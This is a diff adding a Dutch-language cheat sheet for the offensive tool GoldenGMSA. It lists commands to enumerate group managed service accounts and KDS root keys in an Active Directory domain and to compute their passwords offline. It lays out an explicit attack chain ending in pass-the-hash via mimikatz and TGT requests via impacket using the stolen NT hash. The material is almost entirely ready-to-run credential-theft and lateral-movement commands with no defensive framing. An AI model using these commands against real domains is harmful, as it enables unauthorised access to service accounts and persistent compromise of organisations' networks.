@@ -1,0 +1,38 @@
+# GoldenGMSA — Group Managed Service Account (gMSA) wachtwoord extraheren
+# Bereken gMSA wachtwoorden offline met KDS root key, zonder DC interactie
+#
+# === Syntax ===
+# GoldenGMSA.exe <commando> [opties]
+#
+# === Commando's ===
+# gmsainfo   Enumereer gMSA accounts en hun eigenschappen
+# kdsinfo    Enumereer KDS root keys in het domein
+# compute    Bereken het gMSA wachtwoord
+#
+# === Belangrijkste opties ===
+# --sid SID         SID van het gMSA account
+# --kdskey KEY      Base64 KDS root key
+# --domain DOMAIN   Doeldomein
+# --dc DC           Domain Controller
+# --forest FOREST   Forest naam (voor cross-forest)
+#
+# === Aanvalsketen ===
+# 1. Enumereer gMSA accounts met gmsainfo
+# 2. Enumereer KDS root keys met kdsinfo
+# 3. Bereken wachtwoord met compute
+# 4. Gebruik NT hash voor pass-the-hash of silver tickets
+#
+# === Voorbeelden ===
+# -- Enumereer gMSA accounts --
+GoldenGMSA.exe gmsainfo
+GoldenGMSA.exe gmsainfo --domain DOMAIN --dc DC
+# -- Enumereer KDS root keys --
+GoldenGMSA.exe kdsinfo
+GoldenGMSA.exe kdsinfo --domain DOMAIN --dc DC
+# -- Bereken gMSA wachtwoord --
+GoldenGMSA.exe compute --sid S-1-5-21-...-1234 --kdskey BASE64KEY
+GoldenGMSA.exe compute --sid S-1-5-21-...-1234 --kdskey BASE64KEY --domain DOMAIN
+# -- Vervolg: gebruik NT hash --
+# sekurlsa::pth /user:GMSA_ACCOUNT$ /domain:DOMAIN /ntlm:HASH
+# of via impacket:
+# getTGT.py DOMAIN/GMSA_ACCOUNT$ -hashes :HASH
